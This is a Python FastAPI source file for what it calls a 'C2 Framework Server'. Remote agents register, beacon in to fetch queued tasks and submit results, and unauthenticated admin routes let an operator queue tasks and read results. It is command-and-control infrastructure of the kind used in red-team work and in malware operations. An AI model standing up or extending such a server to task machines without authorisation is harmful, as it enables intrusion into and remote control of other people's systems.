from fastapi import FastAPI, Depends, HTTPException
from sqlalchemy.orm import Session
from typing import List
from datetime import datetime

from . import models, schemas, database

models.Base.metadata.create_all(bind=database.engine)

app = FastAPI(title="C2 Framework Server")

# Dependency
def get_db():
    db = database.SessionLocal()
    try:
        yield db
    finally:
        db.close()

@app.get("/")
def health_check():
    return {"status": "active"}

@app.post("/api/register", response_model=schemas.Agent)
def register_agent(agent: schemas.AgentCreate, db: Session = Depends(get_db)):
    db_agent = models.Agent(**agent.dict())
    db.add(db_agent)
    db.commit()
    db.refresh(db_agent)
    return db_agent

@app.post("/api/beacon/{agent_id}", response_model=List[schemas.Task])
def beacon(agent_id: str, db: Session = Depends(get_db)):
    agent = db.query(models.Agent).filter(models.Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    # Update last seen
    agent.last_seen = datetime.utcnow()
    db.commit()

    # Get queued tasks
    tasks = db.query(models.Task).filter(
        models.Task.agent_id == agent_id,
        models.Task.status == "queued"
    ).all()

    # Mark tasks as sent
    for task in tasks:
        task.status = "sent"
    db.commit()

    return tasks

@app.post("/api/results")
def submit_results(result: schemas.ResultCreate, db: Session = Depends(get_db)):
    task = db.query(models.Task).filter(models.Task.id == result.task_id).first()
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")
    
    db_result = models.Result(**result.dict())
    db.add(db_result)
    
    task.status = "completed"
    db.commit()
    
    return {"status": "success"}

# Admin Endpoints

@app.get("/api/agents", response_model=List[schemas.Agent])
def list_agents(db: Session = Depends(get_db)):
    return db.query(models.Agent).all()

@app.post("/api/tasks/{agent_id}", response_model=schemas.Task)
def create_task(agent_id: str, task: schemas.TaskCreate, db: Session = Depends(get_db)):
    agent = db.query(models.Agent).filter(models.Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    db_task = models.Task(**task.dict(), agent_id=agent_id)
    db.add(db_task)
    db.commit()
    db.refresh(db_task)
    return db_task

@app.get("/api/tasks/{agent_id}", response_model=List[schemas.Task])
def list_agent_tasks(agent_id: str, db: Session = Depends(get_db)):
    return db.query(models.Task).filter(models.Task.agent_id == agent_id).all()

@app.get("/api/results/{task_id}", response_model=schemas.Result)
def get_task_result(task_id: int, db: Session = Depends(get_db)):
    result = db.query(models.Result).filter(models.Result.task_id == task_id).first()
    if not result:
        raise HTTPException(status_code=404, detail="Result not found")
    return result
